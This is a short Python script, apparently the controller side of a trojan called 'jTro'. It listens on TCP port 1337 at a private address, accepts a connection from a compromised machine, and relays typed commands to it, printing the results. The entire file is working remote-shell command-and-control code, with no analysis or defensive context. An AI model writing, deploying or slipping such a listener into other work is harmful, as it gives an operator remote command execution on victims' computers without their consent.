#!/usr/bin/env python3
import socket


class Listener:
    def __init__(self, ip, port):
        lst = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        lst.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        lst.bind((ip, port))
        lst.listen(5)
        print("[+] Waiting for incoming connection.")
        self.c, a = lst.accept()
        print("[+] Connection established from " + str(a))

    def execute(self, cmd):
        self.c.send(cmd.encode('utf-8'))
        return self.c.recv(1024).decode('utf-8')

    def run(self):
        while True:
            cmd = input("jTro:~> ")
            res = self.execute(cmd)
            print(res)


jTro_Listener = Listener("192.168.31.207", 1337)
jTro_Listener.run()
